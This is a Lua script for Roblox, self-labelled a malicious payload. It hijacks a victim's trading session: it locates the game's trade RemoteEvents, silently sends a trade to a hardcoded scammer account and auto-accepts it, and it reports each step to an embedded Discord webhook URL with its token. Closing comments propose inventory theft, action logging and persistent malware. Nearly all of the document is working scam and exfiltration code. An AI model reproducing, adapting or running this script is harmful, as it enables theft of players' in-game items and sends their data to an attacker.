-- MALICIOUS PAYLOAD: TRADE SESSION HIJACK
-- This code is executed after the user has been tricked into running the first script.

local httpService = game:GetService("HttpService")
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer

-- URL to send stolen item data to the attacker
local attackerWebhook = "https://discordapp.com/api/webhooks/1411856749559812218/l8emirnmA7sEMSOeQflxhl1U27Gka987AmSgc1hjmZZCLHvR8SGRuMAyTFmi-pR-cZ9p"

-- Function to send a message to the attacker's Discord
local function sendToAttacker(message)
    pcall(function()
        httpService:PostAsync(attackerWebhook, httpService:JSONEncode({content = message}))
    end)
end

-- Function to force a trade with the attacker's account
local function hijackTrade()
    -- 1. Find the trading system in the game
    local tradingService = game:GetService("ReplicatedStorage"):FindFirstChild("Trading") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeEvents")
    
    if tradingService then
        -- 2. Get references to the RemoteEvents used for trading
        local sendRequest = tradingService:FindFirstChild("SendTradeRequest")
        local acceptTrade = tradingService:FindFirstChild("AcceptTrade")
        
        if sendRequest and acceptTrade then
            -- 3. Get the attacker's username from their server (this would be hardcoded by the attacker)
            local attackerUsername = "ScammerAccount123"
            local attackerPlayer = players:FindFirstChild(attackerUsername)
            
            if attackerPlayer then
                -- 4. Silently send a trade request to the attacker
                sendRequest:FireServer(attackerPlayer)
                sendToAttacker("Trade request sent to " .. attackerUsername .. " from " .. localPlayer.Name)
                
                -- 5. Wait and then automatically accept the trade
                task.wait(3)
                acceptTrade:FireServer(attackerPlayer)
                sendToAttacker("Trade accepted with " .. attackerUsername .. " from " .. localPlayer.Name)
                
                -- 6. The attacker would have pre-loaded their side of the trade with worthless items
            end
        end
    end
end

-- Run the hijack function
hijackTrade()

-- Additional malicious functionality could include:
-- - Stealing the user's inventory data
-- - Logging all in-game actions
-- - Injecting more persistent malware
